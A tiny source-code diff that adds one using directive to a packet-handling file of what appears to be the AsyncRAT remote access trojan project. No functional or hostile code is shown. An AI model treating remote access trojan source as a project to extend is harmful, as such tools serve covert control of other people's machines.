@@ -7,6 +7,7 @@ using System.IO;
 using System.Windows.Forms;
 using System.Threading;
 using System.Threading.Tasks;
+using AsyncRAT_Sharp.Helper;
 
 namespace AsyncRAT_Sharp.Handle_Packet
 {
